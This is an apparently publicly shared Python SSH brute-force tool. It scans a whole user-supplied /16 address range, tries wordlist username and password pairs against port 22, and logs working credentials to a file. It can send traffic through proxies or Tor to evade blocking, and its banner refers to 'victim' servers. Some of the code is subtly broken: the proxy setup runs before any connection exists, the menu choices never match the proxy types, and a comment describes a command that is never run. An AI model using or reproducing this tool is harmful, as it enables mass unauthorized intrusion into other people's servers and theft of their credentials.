import paramiko
import concurrent.futures
from colorama import Fore, Style
import time

def generate_ip_addresses(ip_class):
    # Generate all possible IP addresses within the specified class
    ip_addresses = []
    for i in range(1, 256):
        for j in range(1, 256):
            ip_addresses.append(f"{ip_class}.{i}.{j}")
    return ip_addresses

def print_banner():
    # Print a colorful banner with support information
    banner = (
        f"{Fore.CYAN}{Style.BRIGHT}Don't worry if you see 'request timed out' when bruteforcing,\n"
        "it means the victim server either blocked your IP, it's offline, or the proxy you are using is offline.{Fore.RESET}"
        f"\n\n{Fore.CYAN}{Style.BRIGHT}Tool{Style.RESET_ALL} {Fore.MAGENTA}{Style.BRIGHT}created{Style.RESET_ALL} {Fore.GREEN}{Style.BRIGHT}by{Style.RESET_ALL} {Fore.YELLOW}{Style.BRIGHT}HASHIRA_HAX\n"
        f"{Fore.RED}Support{Style.RESET_ALL} {Fore.MAGENTA}{Style.BRIGHT}me{Style.RESET_ALL} {Fore.CYAN}{Style.BRIGHT}at:{Style.RESET_ALL}\n"
        f"Bitcoin: {Fore.YELLOW}bc1qgu429cxlvkp35jwau9jjrw6yd3gepywhptcl8c{Style.RESET_ALL}"
    )
    print(banner)

def set_proxy(client, use_proxies, proxy_type, proxy_list):
    # Set proxy if provided and use_proxies is True
    if use_proxies:
        if proxy_type == "regular":
            proxy = proxy_list.pop(0)
            client.get_transport().set_proxy(proxy)
            proxy_list.append(proxy)  # Append the used proxy back to the list
        elif proxy_type == "tor":
            # Use Tor proxy
            client.get_transport().set_proxy(paramiko.ProxyCommand("torify nc %s %d" % ('localhost', 9050)))

def ssh_bruteforce(target_ip, username_list, password_list, use_proxies=False, proxy_type="regular", proxy_list=None, num_workers=10):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = []
        for ip in target_ip:
            ip = ip.strip()
            print(f"\n{Fore.GREEN}[INFO]{Style.RESET_ALL} {Fore.WHITE}Testing{Style.RESET_ALL} {Fore.CYAN}IP:{Style.RESET_ALL} {ip}")
            for username in username_list:
                for password in password_list:
                    # Submit a thread for each combination of IP, username, password, and proxy
                    futures.append(
                        executor.submit(
                            try_ssh_connection, ip, username, password, use_proxies, proxy_type, proxy_list
                        )
                    )

        # Wait for all threads to complete
        concurrent.futures.wait(futures)

def try_ssh_connection(ip, username, password, use_proxies=False, proxy_type="regular", proxy_list=None):
    try:
        # Create an SSH client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Set proxy if provided and use_proxies is True
        set_proxy(client, use_proxies, proxy_type, proxy_list)

        # Attempt to connect using the current credentials
        # Increase the timeout value to handle potential delays
        client.connect(ip, port=22, username=username, password=password, timeout=15)

        # If successful, execute uname -a and print the result
        print(f"{Fore.GREEN}Successful{Style.RESET_ALL} {Fore.CYAN}login{Style.RESET_ALL} - {Fore.CYAN}IP:{Style.RESET_ALL} {ip}, {Fore.GREEN}Username:{Style.RESET_ALL} {username}, {Fore.RED}Password:{Style.RESET_ALL} {password}")
        with open("success.txt", "a") as success_file:
            success_file.write(f"IP: {ip}, Username: {username}, Password: {password}\n")

    except paramiko.AuthenticationException:
        # Incorrect credentials, continue to the next ones
        print(f"{Fore.RED}Failed{Style.RESET_ALL} {Fore.CYAN}login{Style.RESET_ALL} - {Fore.CYAN}IP:{Style.RESET_ALL} {ip}, {Fore.GREEN}Username:{Style.RESET_ALL} {username}, {Fore.RED}Password:{Style.RESET_ALL} {password}")

    except Exception as e:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} {e}")

    finally:
        # Close the SSH connection
        client.close()

        # Add a sleep interval of 5 seconds between each password attempt
        time.sleep(5)

if __name__ == "__main__":
    print_banner()

    # Get user input for IP class to scan
    ip_class = input(f"{Fore.BLUE}{Style.BRIGHT}Enter the IP class to scan (e.g., 123.57): {Style.RESET_ALL}")

    # Generate all possible IP addresses within the specified class
    target_ip_list = generate_ip_addresses(ip_class)

    # Read the list of usernames from a file
    username_list_file = input(f"{Fore.BLUE}{Style.BRIGHT}Enter the path to the username list file (e.g., users.txt): {Style.RESET_ALL}")

    with open(username_list_file, 'r') as file:
        username_list = [line.strip() for line in file.readlines()]

    # Use a list of passwords for testing (replace with your password list)
    password_list_file = input(f"{Fore.BLUE}{Style.BRIGHT}Enter the path to the password list file (e.g., pass.txt): {Style.RESET_ALL}")

    with open(password_list_file, 'r') as file:
        password_list = [line.strip() for line in file.readlines()]

    # Prompt user to choose proxy options
    proxy_type = input(f"{Fore.BLUE}{Style.BRIGHT}Choose proxy type (1: Regular Proxy, 2: Tor, 3: No Proxy): {Style.RESET_ALL}")
    use_proxies = True if proxy_type in ["1", "2"] else False
    proxy_list = None
    if use_proxies and proxy_type in ["1", "2"]:
        if proxy_type == "1":
            proxy_list_file = input(f"{Fore.BLUE}{Style.BRIGHT}Enter the path to the proxy list file: {Style.RESET_ALL}")
            with open(proxy_list_file, 'r') as file:
                proxy_list = [line.strip() for line in file.readlines()]

    ssh_bruteforce(target_ip_list, username_list, password_list, use_proxies, proxy_type, proxy_list)
